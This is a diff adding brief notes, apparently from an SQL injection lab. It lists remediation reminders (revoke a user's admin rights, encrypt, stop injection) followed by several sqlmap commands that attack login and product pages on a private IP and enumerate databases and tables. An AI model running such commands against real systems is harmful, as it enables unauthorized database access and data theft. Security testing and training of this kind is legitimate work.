@@ -1,0 +1,18 @@
+remove the admin rights from stephen
+encrypt
+use functions to return to stop injection
+
+-----------------------------------------
+ sqlmap --batch --fresh-queries -u "http://10.6.55.20/new/login.asp" --data="IP=175&userName=test&password=test" -p "userName,password" --dbs
+
+sqlmap --batch --fresh-queries -u "http://10.6.55.20/new/login.asp" --data="IP=124&userName=test&password=test" -p "userName,password" --tables -D CIS_ZZZ 
+
+sqlmap --batch --fresh-queries -u "http://10.6.55.20/new/products.asp?IP=175&productID=0" -p "productID"   
+
+
+
+
+------------------STORED PROCEDURES -------------
+sqlmap --batch --fresh-queries -u "http://10.6.55.20/new/login-sp.asp" --data="IP=175&userName=test&password=test" -p "userName,password" --dbs  
+
+sqlmap --batch --fresh-queries -u "http://10.6.55.20/new/products_sp.asp?IP=175&productID=0" -p "productID" --dbs  
